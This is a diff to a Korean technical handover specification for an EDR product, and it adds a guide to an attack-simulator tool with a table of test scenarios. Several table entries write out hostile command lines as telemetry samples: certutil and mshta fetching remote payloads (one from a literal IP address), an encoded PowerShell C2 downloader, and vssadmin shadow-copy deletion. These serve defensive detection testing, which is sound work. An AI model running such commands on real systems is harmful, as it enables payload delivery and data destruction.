@@ -1,7 +1,7 @@
 ---
 description: >-
   Phalanx EDR Phase 1~4.1 구현 완료 현황, 복합 회피 실험 한계점, FileInspectionTool 상세 규격,
-  후속 필수 실험 과제 및 개발 에이전트를 위한 핵심 기술 인수인계 사양서.
+  모의 침해 시뮬레이터(AttackSimulator) 운용 체계, 후속 필수 실험 과제 및 개발 에이전트를 위한 핵심 기술 인수인계 사양서.
 related:
   - ../README.md
   - ./01_system_architecture.md
@@ -79,8 +79,17 @@ Phalanx Root
 │           ├── ThreatReputationTool.cs      # 사설망 마스킹, 공공 DNS 화이트리스트, IoC 평가
 │           ├── MitreClassifierTool.cs       # 26종 정규식 MITRE ATT&CK 전술 매핑
 │           └── SystemFirewallTool.cs        # 게이트웨이 보호망 기반 Windows 방화벽 C2 차단
+├── tools/
+│   └── Phalanx.AttackSimulator/             # EDR 침해 시나리오 모의 생성기 및 텔레메트리 주입 도구
+│       ├── Program.cs                       # 대화형 CLI 메뉴, 타깃 gRPC 엔드포인트 스트리밍
+│       ├── Scenarios/AttackScenarioRegistry.cs # 7대 실무 공격/정상 시나리오 및 페이로드 레지스트리
+│       └── Logging/TestAuditLogger.cs       # 시나리오 실행 및 판정 결과 감사 로거
+├── scripts/
+│   ├── run_attack_simulator.ps1             # 모의 공격 시뮬레이터 원클릭 실행 스크립트 (CLI/배치)
+│   ├── run_fullchain_test.ps1               # 5대 풀체인 E2E 통합 검증 스크립트
+│   └── build.ps1                            # C++ 커널 센서 및 액추에이터 통합 빌드
 └── tests/
-    ├── Phalanx.Agent.Tests/                 # C# 25개 단위 테스트 및 Live 풀체인 테스트
+    ├── Phalanx.Agent.Tests/                 # C# 27개 단위 테스트 및 Live 풀체인 테스트
     └── FullChainCrossE2ETest/               # C++ ➔ C# Cockpit ➔ C++ 크로스 랭귀지 E2E 테스트 바이너리
 ```
 
@@ -103,7 +112,7 @@ Phalanx는 타 저장소(예: MundusVivens)에 대한 런타임 의존성 없이
 
 1. **상시 의무 검증 (Mandatory QA - 오프라인)**:
    * `dotnet build Phalanx.sln`: C# 컴파일 오류 및 경고 0개 확인.
-   * `dotnet test tests/Phalanx.Agent.Tests/ --filter "Category=Unit"`: 25개 순수 단위 테스트 통과 확인 (~1초).
+   * `dotnet test tests/Phalanx.Agent.Tests/ --filter "Category=Unit"`: 27개 순수 단위 테스트 통과 확인 (~1초).
    * `powershell -ExecutionPolicy Bypass -File .\build.ps1`: C++ 네이티브 센서/엔진 빌드.
    * `powershell -ExecutionPolicy Bypass -File .\scripts\run_fullchain_test.ps1`: 5대 풀체인 E2E 크로스 랭귀지 통합 검증.
 
@@ -111,6 +120,50 @@ Phalanx는 타 저장소(예: MundusVivens)에 대한 런타임 의존성 없이
    * 실행 명령어: `dotnet test tests/Phalanx.Agent.Tests/ --filter "Category=Live"`
    * **실행 전제 조건**: `GOOGLE_APPLICATION_CREDENTIALS` 환경 변수 또는 `src/Phalanx.Cockpit/Config/google-credentials.json`이 유효해야 합니다.
    * **실측 검증 대상**: 실제 Gemini 3.7 Flash 모델에 10대 실무 프로세스(악성 6종 + 정상 4종) 침해 수사를 실시간 요청하여 턴 수(평균 2.40턴), 레이턴시, `ACTION_KILL`/`ACTION_RESUME` 판정 무결성을 현장 실사합니다.
+
+### 4.3 모의 침해 공격 시뮬레이터 운용 및 시나리오 검증 체계 (AttackSimulator Guide)
+
+실제 엔드포인트 침해 사고 및 커널 동결/사살, AI ReAct 수사 파이프라인을 실시간 관제 화면(`Phalanx.Cockpit`)과 연동하여 재현 및 시연할 수 있도록 전용 모의 공격 도구(`Phalanx.AttackSimulator`)와 실행 스크립트가 제공됩니다.
+
+#### A. 실행 명령어 및 구동 모드
+* **실행 스크립트**: [`scripts/run_attack_simulator.ps1`](../../../Phalanx/scripts/run_attack_simulator.ps1)
+* **대화형 CLI 메뉴 모드**:
+  ```powershell
+  powershell -ExecutionPolicy Bypass -File .\scripts\run_attack_simulator.ps1
+  ```
+  콘솔에서 대화형 번호 선택 인터페이스를 통해 원하는 시나리오를 선택하여 발송합니다.
+* **단일 시나리오 직결 실행**:
+  ```powershell
+  # 시나리오 1번(Office C2 드롭퍼) 즉시 실행
+  powershell -ExecutionPolicy Bypass -File .\scripts\run_attack_simulator.ps1 -Scenario 1
+
+  # 비대화형 자동화 러너 (CI/배치용)
+  powershell -ExecutionPolicy Bypass -File .\scripts\run_attack_simulator.ps1 -Scenario 1 -NonInteractive
+  ```
+* **전체 시나리오 순차 일괄 검증**:
+  ```powershell
+  # 1~7번 전 시나리오를 4초 간격으로 자동 순차 주입
+  powershell -ExecutionPolicy Bypass -File .\scripts\run_attack_simulator.ps1 -Scenario 8
+  ```
+
+#### B. 7대 실무 시나리오 레지스트리 규격 ([`AttackScenarioRegistry.cs`](../../../Phalanx/tools/Phalanx.AttackSimulator/Scenarios/AttackScenarioRegistry.cs))
+
+| ID | 시나리오 명칭 | 시뮬레이션 페이로드 및 동작 | 기대 처분 (`ExpectedAction`) | 대응 파이프라인 |
+|---|---|---|---|---|
+| **1** | Office LOLBAS C2 Dropper | `winword.exe` ➔ `powershell.exe -enc <C2 다운로더>` | `ACTION_KILL` | 24μs 선제 동결 ➔ ReAct 3턴 사살 (확신도 95%) |
+| **2** | Ransomware Shadow Copy Deletion | `vssadmin.exe delete shadows /all /quiet` | `ACTION_KILL` | C++ 커널 룰 엔진 0.08ms 즉각 현장 사살 (Reflex Kill) |
+| **3** | LOLBAS CertUtil Remote Payload | `excel.exe` ➔ `certutil.exe -urlcache -split -f http://...` | `ACTION_KILL` | 24μs 동결 ➔ 위협 평판 조회 ➔ 사살 및 IoC 등록 |
+| **4** | Browser Drive-by HTA Attack | `msedge.exe` ➔ `mshta.exe http://185.220.101.5/invoice.hta` | `ACTION_KILL` | 24μs 동결 ➔ MITRE ATT&CK T1218.005 분류 ➔ 사살 |
+| **5** | Masquerading Dropper (T1036.005) | `explorer.exe` ➔ `powershell.exe -enc` ➔ `Temp\svchost.exe` | `ACTION_KILL` | 5턴 심층 수사 ➔ 사살 및 Windows 방화벽 C2 차단 |
+| **6** | Benign Admin Script (Known-Good) | `explorer.exe` ➔ `powershell.exe -enc <Get-Service>` | `ACTION_RESUME` | 정상 관리 스크립트 오탐 방지 가드 ➔ 원자적 동결 해제 |
+| **7** | Process Tree DAG Burst | 50개 프로세스 생성/종료 델타 이벤트 연속 주입 | `ACTION_RESUME` | 고부하 인메모리 프로세스 트리 및 관제 콕핏 60FPS 스트레스 검증 |
+
+#### C. 주입 아키텍처 및 듀얼 모드 (Dual Mode)
+1. **gRPC 텔레메트리 스트림 직접 주입 (`--mode grpc`, 기본값)**:
+   * 포트 50051의 Kestrel gRPC 서비스(`PhalanxGrpcService`)로 규격화된 `TelemetryBatch` 프로토콜 버퍼 메시지를 직접 스트리밍.
+   * 실제 악성코드를 OS 상에서 실행하지 않고도 안전하고 완벽하게 커널 텔레메트리 인입 상황을 재현 가능.
+2. **하이브리드 OS 프로세스 스폰 모드 (`GetSafeOsProcessInfo`)**:
+   * 실제 Windows OS 상에서 무해한 안전 프로세스(`cmd.exe /c timeout`, `powershell Start-Sleep`)를 일시 생성하여 실제 PID 및 Win32 핸들 연동을 병행 검증 가능.
 
 ---
 
